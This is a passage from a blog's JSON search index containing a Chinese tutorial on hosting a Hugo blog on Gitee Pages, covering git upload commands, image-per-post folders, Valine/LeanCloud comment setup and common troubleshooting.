","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:2:0","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"上传Blog到Gitee 修改本地blog配置 blog根目录下的config.yml文件需要进行修改，地址填写自己blog的地址，注意后面要添加/ 上传本地blog 进入blog根目录，执行命令初始化git仓库 git init 查看当前git文件状态，可以看到很多红字，就是待添加到本地库中的文件了 git status 添加文件到缓存中 git add . 发布到本地文件库中 git commit -m \"d\" 添加远程仓库地址 git remote add https://gitee.com/tutucoo/tutucoo.git 拉取远程库 git pull 此时会报错，因为之前在gitee仓库GiteePages时添加了index.html文件，导致历史信息不同 使用下面命令进行拉取 git pull origin master --allow-unrelated-histories 拉取成功后，本地出现了readme.md文件和index.html文件，删除它们，然后重新更新本地库 git status git add . git commit -m \"dd\" 最后push到远程gitee库中 git push -u origin master 如果不是第一次push，可以使用下面命令 git push 修改GiteePages目录为public 更新完之后，进入网站地址就可以了 ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:3:0","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"图文文章 博客的核心功能当然是管理文章啦~但是之前生成文章的方式只适合没有图片的情况，如果文章里面有图片就会非常麻烦，而且不利于每篇文章的图片单独管理，Hugo官方推荐把资源放到static目录进行引用，我觉得还是有点不方便的，我需要的是一篇文章一个文件夹，图片在文件夹下面单独存放。 我的方法是创建一个以文章名称命名的文件夹，文件夹内创建一个index.md文件，图片就放在这个文件夹内，引用的时候直接用图片名称就可以了 hugo new posts/这是我的第一篇文章/index.md 执行完上面命令，或者纯手动创建都是可以的 文章编辑完以后，执行编译 hugo git一条龙操作 git status git add . git commit -m \"tt\" git push 最后进入GiteePages服务点击更新按钮 等待片刻，更新网站，文章就发表上去了 ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:4:0","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"评论系统valine配置 我使用的loveit主题，版本是0.2.10，自带了valine 首先，去leancloud.app注册个账号，找到里面的应用keys 再到blog根目录下找到config.toml，找到[params.page.comment.valine]，将appId和appKey填入，enable设置为true，其他的参数不需要设置 然后再进入到leancloud的存储页中，创建两个Class，一个是Comment用于接收评论，另一个是Counter，用于统计文章访问次数 最后，本地进行调试，注意要切换到发布版，否则看不到评论系统 hugo server -e production 此时进入评论区发表评论，如果正常的话，就可以在页面的最下方看到刚发表的评论了，并且在leancloud后台可以接收到评论内容 再看文章阅读次数，也有了变化！ ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:5:0","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"常见问题 ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:6:0","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"不显示css样式 浏览器中f12查看源码，在head元素里看下css加载路径是否正确，如果不正确，需要在配置文件里面进行设置 ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:6:1","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"Gitee上传到github无法显示 push以后Gitee没有自动更新，导致文章不显示的问题。 GiteePages免费版不支持自动更新编译，需要手动更新，所以需要进入GiteePages服务处点击更新GiteePages服务 另外，GiteePages编程Hugo的判断依据是： 仓库编译目录下存在config.toml|json|yaml文件和content目录的时候，会使用hugo生成静态文件。 配置文件的后缀千万不要弄错了，我就是把yaml错写成yml，gitee一直没有编译，导致文章一直没有更新 ","date":"2020-12-08","objectID":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/:6:2","tags":null,"title":"使用GiteePages+Hugo搭建个人技术博客","uri":"/%E4%BD%BF%E7%94%A8giteepages-hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"},{"categories":null,"content":"个人微信@tutucoowx 微信公众号@黑漏洞 ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"","uri":"/about/"}]